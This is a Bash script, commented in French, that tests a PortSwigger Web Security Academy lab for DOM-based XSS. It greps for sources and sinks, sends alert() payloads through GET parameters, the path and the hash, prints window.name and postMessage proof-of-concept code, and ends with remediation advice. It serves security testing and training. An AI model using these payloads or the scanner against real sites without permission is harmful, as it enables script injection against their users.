#!/bin/bash

# ----------- Configuration à adapter -----------
TARGET_URL="https://<your-lab>.web-security-academy.net"
PARAMS=("search" "q" "query" "input" "redirect" "page")
PAYLOADS=(
    "<script>alert('domxss')</script>"
    "\"><svg/onload=alert('domxss')>"
    "';alert(document.domain);//"
    "<img src=x onerror=alert('domxss')>"
    "<iframe src=javascript:alert('domxss')>"
)
HASH_PAYLOADS=(
    "<img src=x onerror=alert('hashdomxss')>"
    "javascript:alert('hashdomxss')"
)
PATH_PAYLOADS=(
    "<img src=x onerror=alert('pathdomxss')>"
)
WINNAME_PAYLOADS=(
    "<img src=x onerror=alert('namedomxss')>"
)
POSTMSG_PAYLOADS=(
    "<img src=x onerror=alert('postmsgdomxss')>"
)
# -----------------------------------------------

print_sep() {
    echo "------------------------------------------------------"
}

# 1. Analyse statique automatique
analyze_sources_sinks() {
    print_sep
    echo "[Analyse] Détection automatique des sources/sinks DOM XSS dans le code source..."
    html=$(curl -sk "$TARGET_URL")
    sources=("location.search" "location.hash" "document.URL" "window.name" "document.referrer" "postMessage")
    sinks=("innerHTML" "document.write" "eval" "setTimeout" "setInterval" "Function" "src" "href" "jQuery")
    found_src=0
    found_sink=0
    for src in "${sources[@]}"; do
        if echo "$html" | grep -q "$src"; then
            echo "  [!] Source détectée : $src"
            found_src=1
        fi
    done
    for sink in "${sinks[@]}"; do
        if echo "$html" | grep -q "$sink"; then
            echo "  [!] Sink détecté : $sink"
            found_sink=1
        fi
    done
    if [[ $found_src -eq 0 ]]; then echo "  [-] Aucune source DOM XSS évidente détectée."; fi
    if [[ $found_sink -eq 0 ]]; then echo "  [-] Aucun sink DOM XSS évident détecté."; fi
    echo "  => Pour une analyse dynamique, ouvrez la page dans Burp Suite DOM Invader ou le navigateur (voir [1][6])."
}

# 2. Test GET paramètre (location.search)
test_get_params() {
    print_sep
    echo "[Vecteur 1] DOM XSS via paramètres GET (location.search, innerHTML, etc.)"
    for param in "${PARAMS[@]}"; do
        for payload in "${PAYLOADS[@]}"; do
            encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$payload'''))")
            url="$TARGET_URL/?$param=$encoded"
            resp=$(curl -sk "$url")
            if echo "$resp" | grep -q "$payload"; then
                echo "  [+] Payload reflété pour $param : $url"
                echo "      => POTENTIELLEMENT VULNÉRABLE (payload retrouvé dans la réponse HTML)"
            else
                echo "  [-] Payload non reflété pour $param : $url"
            fi
        done
    done
    echo "  [Contrôle dynamique] : Ouvrez les liens reflétant le payload dans un navigateur ou Burp DOM Invader pour valider l’exécution JS côté client[1][2][3][6]."
}

# 3. Test hash/fragment (location.hash)
test_hash() {
    print_sep
    echo "[Vecteur 2] DOM XSS via hash/fragment (location.hash, etc.)"
    html=$(curl -sk "$TARGET_URL")
    for payload in "${HASH_PAYLOADS[@]}"; do
        url="$TARGET_URL#$payload"
        if echo "$html" | grep -q "location.hash"; then
            echo "  [!] La page lit location.hash. Testez dynamiquement : $url"
            echo "      => POTENTIELLEMENT VULNÉRABLE"
        else
            echo "  [-] Pas d'usage évident de location.hash."
        fi
    done
    echo "  [Contrôle dynamique] : Ouvrez les liens dans un navigateur ou Burp DOM Invader pour valider l’exécution du payload[1][6]."
}

# 4. Test path (location.pathname)
test_path() {
    print_sep
    echo "[Vecteur 3] DOM XSS via path (location.pathname, etc.)"
    for payload in "${PATH_PAYLOADS[@]}"; do
        url="$TARGET_URL/$payload"
        resp=$(curl -sk "$url")
        if echo "$resp" | grep -q "$payload"; then
            echo "  [+] Payload reflété dans le path : $url"
            echo "      => POTENTIELLEMENT VULNÉRABLE"
        else
            echo "  [-] Payload non reflété dans le path : $url"
        fi
    done
    echo "  [Contrôle dynamique] : Ouvrez les liens reflétant le payload dans un navigateur pour valider l’exécution JS[1][6]."
}

# 5. Test window.name
test_windowname() {
    print_sep
    echo "[Vecteur 4] DOM XSS via window.name"
    html=$(curl -sk "$TARGET_URL")
    if echo "$html" | grep -q "window.name"; then
        echo "  [!] La page lit window.name. Testez dynamiquement dans la console JS :"
        for payload in "${WINNAME_PAYLOADS[@]}"; do
            echo "      window.name='$payload'; window.location='$TARGET_URL';"
        done
        echo "      => POTENTIELLEMENT VULNÉRABLE"
    else
        echo "  [-] Pas d'usage évident de window.name."
    fi
    echo "  [Contrôle dynamique] : Exécutez la commande ci-dessus dans la console JS du navigateur et observez l’exécution du payload[1][6]."
}

# 6. Test postMessage
test_postmessage() {
    print_sep
    echo "[Vecteur 5] DOM XSS via postMessage"
    html=$(curl -sk "$TARGET_URL")
    if echo "$html" | grep -q "postMessage"; then
        echo "  [!] La page utilise postMessage. Testez dynamiquement avec la PoC suivante :"
        for payload in "${POSTMSG_PAYLOADS[@]}"; do
            cat <<EOF
<!DOCTYPE html>
<html>
  <body>
    <script>
      var target = window.open("$TARGET_URL", "targetWin");
      setTimeout(function() {
        target.postMessage("$payload", "*");
      }, 1000);
    </script>
  </body>
</html>
EOF
        done
        echo "      => POTENTIELLEMENT VULNÉRABLE"
    else
        echo "  [-] Pas d'usage évident de postMessage."
    fi
    echo "  [Contrôle dynamique] : Ouvrez la PoC HTML dans un navigateur et observez l’exécution du payload dans la page cible[1][6]."
}

# 7. Conseils/remédiation
print_remediation() {
    print_sep
    echo "[Remédiation & Conseils]"
    echo "- Si un payload est reflété ou exécutable côté client, la page est probablement vulnérable à une DOM XSS."
    echo "- Pour corriger :"
    echo "  * N’utilisez jamais de données non filtrées issues de l’URL ou du DOM dans des sinks dangereux (innerHTML, document.write, etc.)."
    echo "  * Préférez textContent à innerHTML."
    echo "  * Utilisez Trusted Types si possible[8]."
    echo "  * Analysez le JS avec ESLint (plugin Mozilla)[1]."
    echo "- Pour confirmation, ouvrez la page dans Burp Suite DOM Invader ou le navigateur et testez les PoC générés."
    echo "- Documentation PortSwigger : https://portswigger.net/web-security/cross-site-scripting/dom-based"
}

# Exécution séquentielle
echo "=== Script DOM-based XSS : analyse, attaque et contrôle séquentiels ==="
analyze_sources_sinks
test_get_params
test_hash
test_path
test_windowname
test_postmessage
print_remediation

print_sep
echo "[SYNTHÈSE]"
echo "1. Le script a analysé le code source à la recherche de sources/sinks DOM XSS."
echo "2. Il a testé chaque vecteur (GET, hash, path, window.name, postMessage) et contrôlé si le payload est exploitable."
echo "3. Pour confirmation, ouvrez les liens/PoC dans un navigateur ou Burp DOM Invader."
echo "4. Appliquez les recommandations de remédiation si une faille est trouvée."
print_sep

# End of script
